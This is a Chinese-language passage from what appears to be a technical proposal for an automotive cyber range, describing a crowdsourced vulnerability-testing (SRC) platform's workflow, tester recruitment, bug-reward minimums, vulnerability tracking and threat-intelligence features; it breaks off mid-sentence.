title="名人堂展示规则方案"></a>名人堂展示规则方案</h6><p>平台支持名人堂展示规则方案。这有助于建立社区声誉和专业形象，进一步激励他们积极参与测试。</p><p>名人堂展示规则方案是为展示在安全领域取得杰出成就或做出重大贡献的专家所设计的规范。其中包括评选标准、评选流程、不同评选类别、展示内容、奖励形式以及信息更新等方面的规定，旨在公正、透明地表彰安全领域的杰出人才，激励更多人积极投身于安全研究与贡献。</p><h6 id="测试需求评估"><a href="#测试需求评估" class="headerlink" title="测试需求评估"></a>测试需求评估</h6><p>用户需要根据自身的安全需求，通过发送需求评估文档和授权评估函，明确测试要求、时间、测试范围、测试行为等规定。这些规定将发布到平台端供白帽子参考，以确保测试的目标清晰明确。</p><p>用户根据其安全需求，向平台发送需求评估文档与授权评估函。这些文件详细说明本次测试的要求、测试时间安排、涵盖的测试范围、所期望的测试行为等规定。平台会将这些规定发布展示，确保所有参与安全测试的人员清楚了解测试的具体要求和限制。这一举措能够保障测试活动的合规性和准确性，为安全测试提供明确的指导和规范，以确保测试的有效性和可信度。</p><h6 id="白帽子招募与筛选"><a href="#白帽子招募与筛选" class="headerlink" title="白帽子招募与筛选"></a>白帽子招募与筛选</h6><p>平台支持以定向邀请或自主报名的方式，招募白帽子参与测试，以此方式进行白帽子的报名和筛选。</p><p>定向邀请: 平台可以通过特定条件或以往表现优异的白帽子，发出定向邀请参与安全测试测试。这种方式可以针对特定的专业领域或技术能力，有针对性地邀请合适的白帽子参与测试。</p><p>自主报名: 平台也允许白帽子自主报名参与安全测试测试。他们可以浏览平台上发布的测试，根据自身技能和兴趣选择合适的测试进行报名。然后，平台根据一定的筛选标准，对报名者进行评估和筛选，以确定最合适的参与者。</p><h6 id="漏洞审核与验证"><a href="#漏洞审核与验证" class="headerlink" title="漏洞审核与验证"></a>漏洞审核与验证</h6><p>平台支持对白帽子提交的漏洞进行审核和验证。测试技术专家将提供专业的漏洞审核服务，7x24小时不间断工作，以验证、审核和评级漏洞。这有助于确保漏洞的有效性和准确性。</p><p>这个审核流程包括对漏洞的验证和评估，以确认漏洞的真实性和严重性。专业团队将对漏洞进行仔细审查，确定其是否存在以及可能的影响程度。他们会对漏洞进行评级，区分其优先级和影响程度，以便制定相应的修复计划。</p><p>这种由专业团队进行的漏洞审核工作，有助于确保漏洞报告的准确性和可靠性。同时，24小时全天候的服务能够及时响应并处理提交的漏洞报告，提高漏洞修复的效率和及时性，从而增强系统的安全性。</p><h6 id="漏洞修复与复测"><a href="#漏洞修复与复测" class="headerlink" title="漏洞修复与复测"></a>漏洞修复与复测</h6><p>用户在漏洞修复后，团队将与白帽子协同工作，进行漏洞的复测。这确保了每个漏洞都被完全修复，而且不会产生新的漏洞问题，提高了系统的整体安全性。</p><p>这个复测过程包括：</p><p>漏洞验证：重新验证原先被报告的漏洞，确认是否被有效修复。团队会执行相同的测试步骤，以检查漏洞是否已彻底解决。</p><p>回归测试：进行回归测试，确认修复过程中未引入新的漏洞或其他安全问题。此阶段保证修复措施对系统的整体影响。</p><p>全面审查：对修复后的系统进行全面审查，确保系统安全性和稳定性不受影响，并避免新的安全风险或漏洞的产生。</p><h6 id="测试总结与建议"><a href="#测试总结与建议" class="headerlink" title="测试总结与建议"></a>测试总结与建议</h6><p>测试完成后，白帽子将提供详细的测试安全测试总结报告。这份报告不仅分析了用户现有的安全问题，还提供了未来安全建设的有效建议，有助于用户改进其安全体系。</p><p>该报告包括以下内容：</p><p>问题分析与详细说明：对测试过程中发现的问题进行详尽分析和描述，包括漏洞描述、危害程度和可能性等详细信息。</p><p>修复建议：针对发现的问题提供具体的修复建议，说明如何解决每个问题，并提供技术性的建议和步骤。</p><p>安全建设意见：为未来的安全建设提供有效的意见和建议，可能包括提高安全性的最佳实践、改善安全策略、加强防御措施等方面的建议。</p><p>总结与展望：对整体安全测试进行总结，强调改进和建设的必要性，并展望未来的安全工作方向。</p><h6 id="众测时长与人数限制"><a href="#众测时长与人数限制" class="headerlink" title="众测时长与人数限制"></a>众测时长与人数限制</h6><p>规定每次众测服务时间最长不超过1个月，参与的精英可信白帽数量不少于5人。</p><p>在进行众测服务时，测试的测试周期限定在一个月以内，并确保参与测试的白帽子精英团队至少有5名可信成员。这样的设置有助于控制测试时间，提高测试效率，并确保在相对较短的时间内收集到足够的专业反馈和测试数据。同时，拥有来自多个可信白帽子的参与有助于提高测试的多样性和可靠性，从而提高整体测试质量和覆盖范围。</p><h6 id="灵活的奖励机制"><a href="#灵活的奖励机制" class="headerlink" title="灵活的奖励机制"></a>灵活的奖励机制</h6><p>平台提供自定义的漏洞奖励标准和漏洞奖励价格，支持企业自主控制测试范围（最低标准：高危1000中危300低危30）。100%效果付费，无漏洞不收费，消费透明；用户企业可自定义漏洞奖励标准与漏洞奖励价格，自主控制测试范围。采取漏洞奖金预充值的方式</p><p>平台允许根据特定测试的需求或复杂性，设定不同级别漏洞的奖励标准和价格。例如，对于高危漏洞，最低奖励标准为1000；对于中危漏洞，最低奖励标准为300；对于低危漏洞，最低奖励标准为30。</p><p>这种自定义奖励标准和价格的设置，有助于平台根据漏洞的严重性和影响程度，给予合理的奖励以激励白帽子提交高质量的漏洞报告。同时，这也为平台提供了更多灵活性，使其能够根据不同测试的需求设定合适的漏洞奖励政策。</p><h6 id="专业的漏洞报送经验"><a href="#专业的漏洞报送经验" class="headerlink" title="专业的漏洞报送经验"></a>专业的漏洞报送经验</h6><p>团队拥有丰富的漏洞报送经验，并具有漏洞信息报送突出贡献单位的认证。这些要求有助于确保报告的质量和可信度，提供了相关漏洞报送的专业性的证明材料。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1e20ec3bcf76257aff3235df0fad2d4f.png" alt="555c9907d8d665e9d210c17a27cb942"><br>具有漏洞信息报送突出贡献单位的证明材料</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5dbf4ef62175bc7a9cbb0e55e5cbc8e1.jpeg" alt="d7bbb5f7e4a24a0afc5fba3ce008b6d"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/da9c6b61ca25e173abbb754c55636875.png"></p><h4 id="测试流程管理"><a href="#测试流程管理" class="headerlink" title="测试流程管理"></a>测试流程管理</h4><p>测试流程管理模块涵盖了以下关键功能和流程，以确保测试测试的有效进行：</p><p>测试范围明确：测试的测试范围包括车机系统网络层、主机系统层和业务应用层，覆盖了关键零部件的测试内容。这包括了汽车网络安全、业务安全实现等多方面的内容，以确保全面的安全测试。</p><p>完整的测试流程：测试测试的流程包括前期准备、账号分配、测试启动、漏洞确认、漏洞修复、漏洞回检和测试报告等多个环节，确保测试的有序推进和漏洞的及时处理。</p><p>测试前期明确：在测试前期，明确测试的范围、时间以及测试对接人。此外，还明确了测试工程中的监控策略和禁止行为，以确保测试的顺利进行。</p><p>测试发布：在SRC平台上发布测试测试，并按要求定向邀请白帽子参加测试。测试管理人员会分配用户专属账号。</p><p>测试监控和漏洞处理测试管理人员可以使用账号登录SRC平台，实时查看白帽子提交的漏洞详细信息和解决方案。漏洞处理包括审核、VPN账号分配等。</p><p>白帽子测试：白帽子确定后，开始为期等于两周的集中渗透测试。他们在测试过程中不断提交漏洞，平台漏洞审核人员会及时处理漏洞。</p><p>漏洞定级和修复方案：平台的漏洞专家会审核漏洞并提出详细的漏洞定级和修复方案。每个漏洞都会通过邮件和短信通知测试对接人。</p><p>漏洞修复：平台支持提供漏洞信息和修复方案，测试负责人可以及时修复漏洞。</p><p>整改建议和评估报告：基于整体综合风险评估的结果，平台会为用户提供减轻风险的安全建议和措施。评估报告包含了详尽的整改建议，具体全面地指导安全改进。</p><h5 id="功能实施方案-13"><a href="#功能实施方案-13" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>测试范围的详细划分是为了确保车机系统在多层面上的安全性。网络层的测试关注的是车辆内部通信网络的安全性，包括但不限于车辆控制系统间的信息传递是否加密，是否存在可以被利用的通信漏洞。主机系统层的测试则聚焦于车机的操作系统和硬件接口，检查系统的权限管理、数据存储安全性以及硬件接口的防护措施是否到位。业务应用层的测试则是针对车载应用程序，这包括对应用程序的功能实现、代码安全性、数据处理和传输安全性的综合评估。此外，关键零部件的测试内容则是专注于那些对车辆安全性影响最大的部分，如刹车系统、方向控制系统等，确保它们的软硬件设计能够抵御潜在的安全威胁。</li><li>测试流程是一个系统化的过程，能够确保每个阶段都能够高效且无缝地进行。前期准备阶段涉及到与客户的沟通，明确测试目的和预期的结果，以及准备必要的测试工具和环境。账号分配阶段则是为参与测试的白帽子和管理人员创建必要的账户权限。测试启动阶段是正式开始测试的标志，所有的测试人员将根据既定的计划开始工作。漏洞确认阶段是对白帽子提交的漏洞报告进行核实和评估。漏洞修复阶段是对确认的漏洞进行修补，以消除安全隐患。漏洞回检阶段则是对已修复的漏洞进行再次测试，以确保修复措施的有效性。最后，测试报告阶段是总结整个测试过程，记录测试结果，并提出改进建议。</li><li>测试前期的准备工作是确保测试的顺利进行的关键。在测试启动之前，必须明确测试的范围和时间表，以及指定测试对接人，他们将是沟通的桥梁，确保信息的流通和问题的及时解决。同时，也需要制定测试工程中的监控策略，以实时跟踪测试进度，并确保测试活动不会影响到正常的业务运行。此外，还需要明确禁止的行为，比如禁止对生产环境进行破坏性测试，禁止泄露测试过程中获取的敏感信息等，以此来保护企业的利益和客户的隐私。</li><li>在SRC平台上发布测试测试是一个标准化的流程。通过这个平台，企业可以清晰地定义测试的需求和目标，同时也可以根据测试的特点和难度，定向邀请具备相应技能的白帽子参加。这种邀请制不仅可以提高测试的效率，还可以确保测试的质量。此外，测试管理人员也会获得专属账号，这样他们就可以在平台上进行有效的测试管理，包括监控测试进度、审核漏洞报告等。</li><li>测试管理人员通过SRC平台的账号，可以实时监控测试的进展情况。这个账号提供了一个信息丰富的界面，通过它，管理人员可以清晰地查看到每一个提交的漏洞的详细信息，包括漏洞的类型、影响范围、严重程度以及可能的利用方式。同时，平台还会提供对应的解决方案，这些方案通常由提交漏洞的白帽子或者平台的安全专家提出，能够帮助企业快速有效地解决问题。</li><li>测试发布到SRC平台后，平台会启动为期一周左右的邀请流程，这个流程是通过平台的内部机制自动运行的。在这个阶段，平台会根据测试的具体需求，筛选合适的白帽子进行邀请。邀请完成后，平台运营人员将负责审核白帽子的资质，分配VPN账号以确保测试的网络环境安全，并准备好相关的注意事项，这些都是为了确保测试能够在一个安全、控制的环境中进行。</li><li>白帽子确认参与后，将开始为期不少于两周的集中渗透测试。在这个阶段，白帽子将会使用各种渗透测试技巧和工具，尝试发现系统的潜在漏洞。测试过程中，他们会不断地提交漏洞报告，SRC平台的漏洞审核人员将负责对这些报告进行及时的处理，包括验证漏洞的真实性、评估漏洞的严重性以及记录漏洞信息。</li><li>平台漏洞专家确认了漏洞的存在后，他们将立即对漏洞进行定级，并提出专业且详细的修复方案。这个方案将会详细说明修复步骤，包括必要的代码修改、配置调整或者硬件更换等。每个确认的漏洞都会通过邮件和短信等通知方式，迅速告知测试对接人，以便他们可以及时采取行动，开始漏洞的修复工作。</li><li>SRC平台不仅提供了一个漏洞提交和确认的平台，还支持测试负责人对漏洞进行及时修复。平台会提供详细的漏洞信息，包括漏洞的发现过程、影响范围、潜在风险等，同时还会提供修复方案，这些方案是由经验丰富的安全专家根据漏洞的具体情况定制的，帮助测试负责人快速有效地解决安全问题。</li><li>SRC平台的综合风险评估服务是基于对测试测试结果的全面分析而提供的。评估报告会详细列出所有的安全问题，并对每个问题进行风险评级。基于这些信息，平台的安全专家会提出削减风险的安全建议和措施。这些建议和措施将会是合理的、可实施的、适度的，并且涵盖了整个系统的安全性改进。这样的评估报告对于企业来说是极其宝贵的，因为它不仅指出了当前的安全问题，还提供了具体的解决方案，帮助企业提升整体的安全水平。</li></ol><h5 id="技术实现内容-10"><a href="#技术实现内容-10" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="广泛的测试范围"><a href="#广泛的测试范围" class="headerlink" title="广泛的测试范围"></a>广泛的测试范围</h6><p>SRC平台的测试范围涵盖了车机系统网络层、主机系统层以及业务应用层，包括关键零部件的测试内容。不限于1、汽车网络安全，包含汽车网络本身设计是否合理，是否满足安全需求，是否设置了合适的安全策略，安全机制是否存在绕过的可能，是否能抵挡外部的攻击等。2、业务安全实现，包含业务是否正确的实现，开发中的错误，车载网络、系统、应用中的安全漏洞等。</p><p>车机系统网络层：涉及汽车内部网络结构的安全性检测，包括网络通信协议、连接方式、数据传输的安全性等方面的测试。</p><p>主机系统层：对汽车主要控制系统的安全性进行评估，包括车辆控制单元（ECU）、操作系统、固件等的安全性检测。</p><p>业务应用层：针对车载应用程序的安全性进行检测，包括车载娱乐系统、导航系统等业务应用的漏洞测试。</p><p>关键零部件测试内容：针对汽车中的关键部件检测。</p><p>具体测试内容包括但不限于以下两个方面：</p><p>汽车网络安全：评估汽车网络设计的合理性，检测是否满足安全需求，查看是否存在安全策略缺失或安全机制绕过的可能性，并测试其抵御外部攻击的能力。</p><p>业务安全实现：检查汽车业务实现过程中的错误，评估车载网络、系统和应用中存在的安全漏洞，确保业务的正确实现和功能的安全性。</p><h6 id="清晰的测试流程"><a href="#清晰的测试流程" class="headerlink" title="清晰的测试流程"></a>清晰的测试流程</h6><p>测试的测试流程经过设计，包括前期准备、账号分配、测试启动、漏洞确认、漏洞修复、漏洞回检以及测试报告等多个阶段。这些流程的定义和执行确保了测试测试的有序进行，漏洞的及时处理以及最终的测试报告准备。</p><p>测试流程包括以下步骤：</p><p>前期准备：确定测试范围、目标和相关约束条件，收集所需资料和准备测试环境。</p><p>账号分配：为参与测试的相关人员分配必要的账号和权限，确保他们能够进行测试所需的操作。</p><p>测试启动：正式启动测试测试，通知相关团队和人员，确保测试的顺利展开。</p><p>漏洞确认：测试人员开始执行测试，发现潜在漏洞，并进行初步确认，验证其真实性和严重性。</p><p>漏洞修复：报告确认后，通知相关团队进行漏洞修复，解决已确认的漏洞问题。</p><p>漏洞回检：修复漏洞后，再次进行测试确认，确保漏洞已被完全修复，不再存在安全问题。</p><p>测试报告：整理测试结果，编制测试报告，详细记录测试过程、发现的漏洞以及修复情况，并提出后续改进建议。</p><h6 id="测试前期准备"><a href="#测试前期准备" class="headerlink" title="测试前期准备"></a>测试前期准备</h6><p>在测试开始之前，将明确测试的范围、时间、测试对接人，并定义测试工程中的监控策略和禁止行为，以确保测试的有序进行。</p><p>在测试前期，明确定义以下几个方面：</p><p>范围和时间: 确定测试的范围、持续时间和期望达到的目标。明确规定测试将涉及的系统、应用或网络范围，以及测试的开始和结束时间。</p><p>测试对接人: 指定测试的主要对接人员，负责协调和管理测试流程。这些人员应该负责与测试团队沟通、解决问题和提供支持。</p><p>监控策略: 明确测试工程中的监控策略，包括对系统、网络或应用的实时监控措施。确保能够及时发现和应对可能出现的异常情况。</p><p>禁止行为: 明令禁止的行为，包括不允许的测试范围、操作、攻击手段等。明确规定哪些行为属于禁止范围，以及不允许对系统造成影响或损害的操作。</p><h6 id="测试发布与白帽子邀请"><a href="#测试发布与白帽子邀请" class="headerlink" title="测试发布与白帽子邀请"></a>测试发布与白帽子邀请</h6><p>在SRC平台上发布测试测试，并按照要求定向邀请合适的白帽子参加测试。同时，也为测试管理人员分配了用户专属账号，以便他们实时监控测试的进展。</p><p>在SRC平台上发布测试测试是为了利用白帽子的技能和专业知识对特定系统或网络进行安全测试。这一过程涉及测试的详细描述，包括测试的范围、目标以及预期的结果。定向邀请白帽子参与测试是为了确保只有经过筛选和认可的专业人士可以参与，以确保测试的高质量和有效性。同时，为测试管理人员分配专属账号是为了确保对测试测试的管理和监督，这些账号通常具有特殊权限，允许管理人员跟踪进展、审查结果并与参与者进行沟通。通过这种方式，在SRC平台上发布测试测试并邀请白帽子参与，可以实现对系统或网络安全的全面评估和改进，确保其安全性和稳健性。</p><h6 id="测试管理人员查看白帽子提交的解决方案"><a href="#测试管理人员查看白帽子提交的解决方案" class="headerlink" title="测试管理人员查看白帽子提交的解决方案"></a>测试管理人员查看白帽子提交的解决方案</h6><p>系统支持测试管理人员使用专属账号登录SRC平台，可以实时清晰地查看白帽子提交的漏洞详细信息和对应的解决方案。</p><p>测试管理人员可以使用其账号登录SRC平台，通过该平台实时、清晰地查看白帽子提交的漏洞详细信息以及相应的解决方案。该功能允许测试管理人员获取漏洞报告的所有相关信息，包括漏洞的描述、影响范围、危害级别等详细内容。此外，他们还能够查看相应的解决方案或建议，包括针对漏洞的修复措施、建议的安全补丁或其他措施。</p><p>通过SRC平台，测试管理人员能够对漏洞进行全面的审查和评估，了解漏洞的严重程度，并快速获取解决方案以便进行相应的修复工作。这种实时、清晰的查看方式有助于管理人员更加高效地组织漏洞修复工作、提高响应速度，确保系统安全和稳定性。同时，也为测试管理人员提供了更直观、全面的数据和信息，以便他们能够更好地管理漏洞修复流程，从而确保系统的持续安全运行。</p><h6 id="集中渗透测试"><a href="#集中渗透测试" class="headerlink" title="集中渗透测试"></a>集中渗透测试</h6><p>一旦测试发布后，SRC平台会开始为期一周左右的白帽子邀请，然后由平台运营人员进行审核、VPN账号分配以及其他必要的准备工作。随后，白帽子开始为期等于两周的集中渗透测试。在测试过程中，他们会不断提交发现的漏洞，而平台漏洞审核人员将会及时处理这些漏洞。</p><p>测试管理人员获得的专属账号赋予了他们在SRC平台上特殊的权限，使其能够实时、清晰地查看白帽子提交的漏洞详细信息和相应的解决方案。通过这个账号，管理人员可以直接登录SRC平台并访问有关测试测试的相关页面。他们可以深入了解每个提交的漏洞报告，包括漏洞的描述、可能的影响、触发条件以及漏洞利用的步骤或证明。此外，对应的解决方案也将被提供，这些方案包括修复建议或其他必要的措施来解决发现的漏洞。</p><p>管理人员可以利用这些信息来评估漏洞的严重性和优先级，并采取相应的措施。他们可以与相关团队或系统负责人合作，制定和实施解决方案，以修复或缓解这些安全漏洞。这种实时查看漏洞报告并获取解决方案的能力，使得管理人员可以快速响应并处理系统或网络中发现的安全问题，从而有效地提高系统的安全性和稳定性。</p><h6 id="漏洞审核与修复"><a href="#漏洞审核与修复" class="headerlink" title="漏洞审核与修复"></a>漏洞审核与修复</h6><p>SRC平台的漏洞专家会审核并定级漏洞，并提供专业详细的修复方案。每个漏洞都会通过邮件和短信的方式告知测试对接人，以便及时修复。</p><p>一旦白帽子确认参与测试，测试过程就会开始，通常持续不少于两周的集中渗透测试。在这段时间里，白帽子会专注于系统或网络的安全性，并不断提交他们发现的漏洞和安全漏洞报告。这些报告会通过SRC平台提交，进入漏洞审核流程。</p><p>平台上的漏洞审核人员在白帽子提交漏洞报告后会迅速介入，并进行审核和评估。他们会仔细检查每个漏洞报告，验证其真实性、严重性和可复现性。审核人员会尽快处理漏洞，可能会联系相关团队或系统负责人确认漏洞，并协助制定解决方案。同时，他们会及时更新漏洞的状态和处理进展，确保透明度和及时性。</p><p>这种快速响应和及时处理漏洞的流程，有助于最大限度地减少系统或网络受到的潜在威胁。通过白帽子的持续渗透测试和漏洞审核人员的迅速处理，系统的安全性得以不断评估和提升，使得潜在的安全风险得到及时管理和解决。</p><h6 id="漏洞信息共享"><a href="#漏洞信息共享" class="headerlink" title="漏洞信息共享"></a>漏洞信息共享</h6><p>平台支持提供漏洞信息及修复方案，并支持测试负责人对漏洞进行及时修复，以确保漏洞不会被滥用或进一步恶化。</p><p>一旦平台漏洞专家确认了存在的漏洞，他们会立即对漏洞进行定级，评估其严重性和影响，并提出专业详细的修复方案。这些修复方案可能包括详细的技术指导、修补程序或建议的安全改进措施，能够解决漏洞并加强系统或网络的安全性。</p><p>每个漏洞都会通过邮件和短信等方式通知测试对接人。这种通知方式可以确保测试对接人能够及时了解漏洞的存在和相关修复方案。这样的沟通方式有助于加快漏洞修复的速度，并使测试对接人能够及时将修复方案传达给相关团队或系统负责人，以便迅速采取行动修复漏洞。</p><p>通过快速定级和提供专业详细的修复方案，并通过多种方式通知相关人员，可以确保漏洞得到及时且有效地处理。这种协作和沟通机制有助于最大程度地降低系统或网络受到漏洞威胁的风险，同时提高了对系统安全性的持续关注和改进。</p><h6 id="综合风险评估"><a href="#综合风险评估" class="headerlink" title="综合风险评估"></a>综合风险评估</h6><p>根据整体综合风险评估的结果，将为用户提供削减风险的安全建议与措施。评估报告中包含了合理、可实施、具体全面的整改建议，帮助用户改进其安全体系，降低潜在风险。</p><p>依据整体综合风险评估的结果，安全专家会为用户提出削减风险的安全建议与措施。这些安全建议能够通过详尽的评估报告，包含合理、可实施、适度、具体和全面的整改建议，来降低系统或网络所面临的潜在风险。</p><p>报告中的建议涉及多个层面，包括技术、策略和流程方面。针对发现的各类漏洞和风险，安全专家会提出相应的解决方案。这些解决方案涉及更新软件补丁、加强身份验证措施、改进访问控制等措施。</p><p>这些建议根据漏洞和风险的严重性和优先级排序，并提供详细说明以确保易于理解和实施。整改建议的全面性和具体性有助于用户了解安全漏洞的性质和影响，以及采取措施加强安全性的紧迫性。通过执行这些建议，用户能够逐步降低系统或网络面临的潜在风险，提升整体的安全水平。</p><h4 id="平台对接"><a href="#平台对接" class="headerlink" title="平台对接"></a>平台对接</h4><p>平台对接模块提供了以下关键功能，以确保用户能够有效地与平台进行互动和协作：</p><p>测试资源申请：用户可以通过平台提交测试资源申请，包括建立VPN、内网通道、提供测试环境等功能，以便进行安全测试。</p><p>漏洞上报：平台支持用户将发现的漏洞直接上报，这些漏洞会被推送到漏洞管理平台进行进一步处理和管理。</p><h5 id="功能实施方案-14"><a href="#功能实施方案-14" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>为了有效地响应用户的测试资源申请，靶场建立了专门的VPN通道，确保测试活动在一个安全隔离的环境中进行，以防止潜在的安全威胁和数据泄露，还需要构建稳定的内网通道，以便测试人员能够无缝访问到测试环境。提供测试环境的同时，靶场管理系统还要确保这些环境具备必要的测试工具和数据，模拟真实的业务场景，让测试人员能够更加深入地进行安全测试。测试完成后，靶场还需要有一套完善的资源回收流程，确保所有的测试资源都能够被及时、妥善地回收，避免资源浪费，并清理可能遗留的敏感数据，保障后续用户的测试活动不会受到之前测试活动的影响。</li><li>靶场平台的漏洞上报功能是一个关键的环节，它允许用户将发现的安全漏洞及时上报，并且确保这些信息能够被准确无误地推送到漏洞管理平台。这个过程中，靶场平台会对提交的漏洞报告进行初步的格式和内容审核，确保报告的完整性和合理性。一旦漏洞报告被提交，漏洞管理平台将会自动记录下来，并通知安全团队进行进一步的分析。这个上报机制不仅加快了漏洞处理的速度，也提高了安全团队对于漏洞的响应效率，从而缩短了从发现漏洞到修复漏洞的整体时间。</li><li>漏洞平台提供的接口是监控和跟踪漏洞审核认定状态的重要功能。通过这个接口，平台可以获取每个漏洞的处理进度，包括但不限于漏洞的确认、评估、分配给相应的处理人员等状态。此外，这个接口还能够提供详细的漏洞信息，如漏洞的严重程度、影响范围、预计的修复时间等，帮助相关人员更好地安排漏洞修复的优先级和资源分配。这种透明化的处理流程不仅提高了漏洞处理的透明度，也提升了团队协作效率，确保了安全问题能够得到及时有效的解决。</li><li>安全运营平台的对接是实现漏洞关联分析的关键步骤。通过与安全运营平台的深度整合，靶场平台可以将发现的漏洞信息与运营平台中已有的安全事件和威胁情报进行匹配分析。这种关联分析有助于揭示不同漏洞之间的内在联系，比如是否存在共同的攻击者、攻击手法是否相似、漏洞是否属于同一安全事件的不同表现等。这些分析结果对于安全团队来说很重要，它们不仅可以帮助安全团队更准确地评估安全威胁的真实性和严重程度，还能够指导他们制定更为有效的防御策略和响应措施，从而提升整个组织的安全防护能力。</li></ol><h5 id="技术实现内容-11"><a href="#技术实现内容-11" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="提供测试资源支持"><a href="#提供测试资源支持" class="headerlink" title="提供测试资源支持"></a>提供测试资源支持</h6><p>平台可以灵活响应用户的测试资源申请，包括但不限于建立VPN通道、内网通信通道、提供测试环境等多种功能。这确保了用户能够获得所需的资源以顺利进行安全测试。</p><p>靶场平台通常会响应用户的测试资源申请，以便于用户能够进行安全测试和评估。这些资源包括但不限于建立VPN（虚拟专用网络）、提供内网通道、搭建测试环境以及在测试完成后回收资源等功能。</p><p>建立VPN和提供内网通道是为了使用户能够安全地远程访问被测试系统或网络，确保他们可以进行安全评估和渗透测试。这种远程访问的方式允许用户在一个受控环境下进行测试，而不会影响生产系统或网络。</p><p>平台也会为用户提供所需的测试环境，包括搭建模拟的系统、网络或应用程序，以便用户进行各种安全测试，如漏洞扫描、渗透测试等。测试环境通常是在隔离的区域内创建，以防止对生产环境造成潜在风险。</p><p>最后，在测试完成后，靶场平台会及时回收用户所使用的资源，确保安全性和资源的合理利用。这个回收资源的过程有助于维持平台的稳定性和安全性。</p><p>通过这些功能和服务，靶场平台能够有效地支持用户进行安全测试活动，提供必要的测试环境和资源，同时确保测试的安全性和可控性。</p><h6 id="漏洞上报和推送"><a href="#漏洞上报和推送" class="headerlink" title="漏洞上报和推送"></a>漏洞上报和推送</h6><p>提供了漏洞上报功能，让用户能够提交所发现的漏洞。一旦用户提交漏洞，会将这些漏洞信息推送到漏洞管理平台，以便后续的审核和处理。</p><p>这个过程涉及以下步骤：</p><p>接收漏洞报告： 平台会提供一个界面，供用户提交他们发现的漏洞。这包括漏洞的详细描述、漏洞利用的步骤、漏洞影响范围以及可能的解决方案。</p><p>漏洞验证与处理： 平台的安全团队或相关专家会对接收到的漏洞报告进行验证和评估。他们会确认漏洞的真实性和严重性，并可能重现漏洞来确认其有效性。</p><p>推送至漏洞管理平台： 一旦漏洞被验证并确认，平台会将这些信息推送至漏洞管理平台。</p><h6 id="漏洞状态跟踪"><a href="#漏洞状态跟踪" class="headerlink" title="漏洞状态跟踪"></a>漏洞状态跟踪</h6><p>通过漏洞管理平台提供的接口，能够帮助用户跟踪漏洞的审核认定状态。用户可以随时了解漏洞的处理进展，确保漏洞得到及时处理和解决。</p><p>通过漏洞平台提供的接口，用户可以跟踪漏洞的审核认定状态。这个接口会提供漏洞的实时信息，包括漏洞报告的审核状态、处理进展以及最新的更新。</p><p>使用这个接口，用户可以随时查询漏洞的审核状态，例如漏洞是否已被确认、正在审核中、已得到解决或正在进行修复等。这些信息能够帮助用户了解漏洞报告的处理进展，以及安全团队对漏洞的认定程度。</p><p>漏洞平台提供的接口还包括其他相关信息，比如漏洞的详细描述、严重性评级、提供报告的白帽子的信息等。这些信息的及时更新和提供，有助于用户全面了解漏洞的情况和处理进程，从而更好地管理漏洞的修复和处理过程。</p><h6 id="漏洞关联分析"><a href="#漏洞关联分析" class="headerlink" title="漏洞关联分析"></a>漏洞关联分析</h6><p>平台与安全运营平台对接，实现漏洞关联分析。</p><p>漏洞数据整合： 将漏洞平台收集到的漏洞数据与安全运营平台中的其他安全数据（如日志、事件数据等）进行整合。这使得安全运营团队可以在一个统一的界面或系统中查看综合的安全信息。</p><p>关联分析： 结合漏洞数据和其他安全数据，进行关联分析和检测。通过将漏洞数据与可能的攻击模式、异常行为或已知的威胁情报进行关联，有助于发现潜在的安全威胁并及时采取措施进行防范。</p><h2 id="测试背景"><a href="#测试背景" class="headerlink" title="测试背景"></a>测试背景</h2><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/594c58d3b1d9442ad28298c6b3cb0a22.png"></p><p>漏洞管理平台作为漏洞统一管理的系统，对漏洞生命周期做全面的管理，支持同步靶场平台、汽车安全运营平台、漏洞提交平台（SRC）等平台的漏洞信息。</p><p>SRC平台作为众测活动的基础，旨在招募汽车安全白帽子对相关车载系统、零部件进行全面漏洞风险评估，并由专业人员进行漏洞管理和白帽子管理。</p><h1 id="智能汽车网络靶场威胁情报平台"><a href="#智能汽车网络靶场威胁情报平台" class="headerlink" title="智能汽车网络靶场威胁情报平台"></a>智能汽车网络靶场威胁情报平台</h1><h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="功能实施方案-15"><a href="#功能实施方案-15" class="headerlink" title="功能实施方案"></a>功能实施方案</h3><ol><li>威胁情报平台提供的情报数据服务的核心在于将大量的原始数据转换为有实际应用价值的情报。数据加工是这一流程的基础，它包括从多个数据源收集数据，然后进行清洗、整理、去噪、标准化、去重和分类等一系列处理步骤，以确保数据的质量和可用性。数据应用则是将加工后的数据根据不同行业的特点进行进一步的定制化处理，这样企业客户就能直接利用这些数据来支持决策制定、风险评估和安全防范等活动。情报数据内容丰富，不仅包括样本数据、DNS查询数据、URL访问数据等基础信息，还包括来自第三方的专业情报，如暗网监控数据、漏洞数据库、恶意软件分析报告等，这些数据共同构成了企业安全防护的情报基础。</li><li>威胁研判分析是威胁情报平台的重要功能之一，它能够对域名、IP地址、电子邮箱、文件HASH、证书指纹以及其他相关字符串等标识符进行深入分析。平台通过对这些标识符的关联分析和行为分析，可以揭示背后的攻击实体的真实性以及攻击团伙/软件的意图与能力。这些分析结果对于安全团队来说至关重要，因为它们可以帮助团队有效地筛选出真实且重要的安全警报，从而快速响应潜在的安全威胁。此外，平台还可以根据报警内容提供相关的分析研判支持，帮助安全团队深入理解每个警报背后的威胁情境，制定更为精准的防御措施。</li><li>情报多源聚合与管理是威胁情报平台的另一个关键功能。在现代的网络安全防护中，单一来源的情报往往难以全面覆盖所有的安全威胁。因此，威胁情报平台需要能够支持多维度、多类型的情报源收集情报，包括开放源、私有源、政府机构和行业组织等，并将这些情报进行有效的整合和管理。这样不仅可以提高情报的覆盖面和准确性，还可以确保各种情报源之间的信息能够相互验证，相互补充，为安全团队提供更全面、更深入的威胁视角。</li><li>漏洞情报是网络安全中不可或缺的一部分，尤其对于车辆系统来说，这一点更为